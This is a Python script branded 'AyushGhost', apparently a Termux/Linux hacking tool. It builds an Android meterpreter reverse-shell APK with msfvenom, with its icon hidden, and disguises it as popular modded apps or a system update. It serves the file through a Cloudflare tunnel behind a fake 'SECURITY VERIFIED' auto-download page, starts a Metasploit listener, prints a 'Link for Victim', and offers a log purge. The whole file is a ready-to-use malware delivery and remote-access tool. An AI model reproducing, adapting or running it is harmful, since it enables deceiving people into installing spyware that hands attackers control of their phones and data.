#magam ladle miau ghop ghop ghop  
#!/usr/bin/env python3
import os, sys, time, subprocess, re

class AyushGhost:
    def __init__(self):
        # Professional Colors
        self.C, self.G, self.Y, self.R, self.W, self.B, self.P, self.Z = \
            "\033[1;36m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;37m", "\033[1;34m", "\033[1;35m", "\033[0m"
        
        self.is_termux = os.path.exists("/data/data/com.termux")
        self.apps = [
            "CapCut_Pro", "Instagram_Gold", "Facebook_Lite", "VN_Editor", "WhatsApp_Plus",
            "Snapchat_Mod", "TikTok_Premium", "Free_Fire_Hack", "PUBG_Tool", "Netflix_Mod",
            "Spotify_Premium", "PicsArt_Pro", "Lightroom_Mod", "KineMaster_Pro", "Canva_Premium"
        ]
        
        self.ui_loading() 
        self.init_env()

    def slow_type(self, text, speed=0.02):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(speed)
        print()

    def ui_loading(self):
        os.system("clear")
        # New AyushGhost Branding
        banner = f"""{self.G}
     █████╗ ██╗   ██╗██╗   ██╗███████╗██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
    ██╔══██╗╚██╗ ██╔╝██║   ██║██╔════╝██║  ██║██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
    ███████║ ╚████╔╝ ██║   ██║███████╗███████║██║  ███╗███████║██║   ██║███████╗   ██║   
    ██╔══██║  ╚██╔╝  ██║   ██║╚════██║██╔══██║██║  ██║██╔══██║██║   ██║╚════██║   ██║   
    ██║  ██║   ██║   ╚██████╔╝███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝{self.Z}
                                {self.W}AUTHOR: AYUSHGHOST {self.R}[V9.0]{self.Z}"""
        
        for line in banner.split('\n'):
            print(line)
            time.sleep(0.12)
        
        print(f"{self.B}  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{self.Z}")
        self.slow_type(f"{self.B}  ┃ {self.W}ID: {self.G}AYUSH-GHOST {self.B}     ┃ {self.W}STATUS: {self.R}ULTRA-STABLE {self.B} ┃ {self.W}OS: {self.Y}{'TERMUX' if self.is_termux else 'LINUX'}{self.B}   ┃")
        print(f"{self.B}  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{self.Z}")
        time.sleep(0.4)

    def init_env(self):
        if not os.path.exists("pub"): os.makedirs("pub")
        os.system("pkill -f 'python3 -m http.server' > /dev/null 2>&1")
        os.system("pkill -f 'cloudflared' > /dev/null 2>&1")

    def start_deploy(self):
        print(f"\n{self.B}[{self.W}01{self.B}] {self.W}Direct Infiltration  {self.B}[{self.W}02{self.B}] {self.W}App Binder Mode{self.Z}")
        mode = input(f"\n{self.G}AyushGhost@root:~$ {self.Z}")
        
        target = "System_Update"
        if mode == "2" or mode == "02":
            print(f"\n{self.Y}[*] Loading App Database...{self.Z}")
            for i, a in enumerate(self.apps, 1):
                print(f"{self.C}{i:02d}.{self.W}{a:<18} ", end="")
                if i % 3 == 0: print()
            try:
                idx = int(input(f"\n\n{self.Y}Select App Number: {self.Z}")) - 1
                target = self.apps[idx]
            except: target = "System_Update"

        print(f"\n{self.Y}[*] Opening Secure Tunnel...{self.Z}")
        subprocess.Popen("python3 -m http.server 8080 --directory pub > /dev/null 2>&1", shell=True)
        subprocess.Popen("cloudflared tunnel --url http://127.0.0.1:8080 > cf.log 2>&1", shell=True)
        
        url = ""
        for _ in range(15):
            if os.path.exists("cf.log"):
                with open("cf.log", "r") as f:
                    match = re.search(r'https://[a-z0-9-]+\.trycloudflare\.com', f.read())
                    if match: url = match.group(0); break
            time.sleep(1)

        if not url: print(f"{self.R}[!] Tunnel Failed! Restart Tool.{self.Z}"); return

        print(f"{self.G}[+] Public URL: {self.W}{url}{self.Z}")
        lhost = input(f"{self.C}SET LHOST: {self.Z}")
        lport = input(f"{self.C}SET LPORT: {self.Z}")

        print(f"{self.Y}[*] Building AyushGhost Payload: {target}.apk...{self.Z}")
        # Stealth Build
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} AndroidEnableStageEncoding=true AndroidHideAppIcon=true -o pub/{target}.apk > /dev/null 2>&1")
        
        if os.path.exists(f"pub/{target}.apk"):
            # Dark Web Page Design
            html = f"""<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>
            <style>body{{background:#000;color:#0f0;text-align:center;padding:50px;font-family:monospace;}}
            .box{{border:1px solid #0f0;padding:20px;display:inline-block;}}</style></head>
            <body><div class='box'><h2>SECURITY VERIFIED</h2><p>App: {target.replace('_',' ')}</p>
            <p>Status: Ready to Download</p></div>
            <script>setTimeout(()=>{{location.href='{target}.apk'}},2000);</script></body></html>"""
            
            with open("pub/index.html", "w") as f: f.write(html)
            
            with open("handler.rc", "w") as f:
                f.write(f"use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nset ExitOnSession false\nexploit -j -z\n")
            
            print(f"\n{self.G}[✔] ATTACK LIVE!{self.Z}")
            print(f"{self.W}Link for Victim: {self.Y}{url}{self.Z}")
            
            if self.is_termux: os.system("msfconsole -r handler.rc")
            else: subprocess.Popen(f"gnome-terminal -- bash -c 'msfconsole -r handler.rc; exec bash'", shell=True)
        else:
            print(f"{self.R}[!] MSFVenom Error. Check Metasploit.{self.Z}")

    def main(self):
        while True:
            print(f"\n{self.B}[01] {self.W}Start AyushGhost")
            print(f"{self.B}[02] {self.W}Clear All Logs")
            print(f"{self.B}[00] {self.W}Exit")
            c = input(f"\n{self.G}AyushGhost@root:~$ {self.Z}")
            if c == "1" or c == "01": self.start_deploy()
            elif c == "2" or c == "02": 
                os.system("pkill -f python3; pkill -f cloudflared; rm -rf pub/* cf.log handler.rc")
                print(f"{self.G}[+] System Purged.{self.Z}")
            elif c == "0" or c == "00": sys.exit()

if __name__ == "__main__":
    try: AyushGhost().main()
    except KeyboardInterrupt: sys.exit()
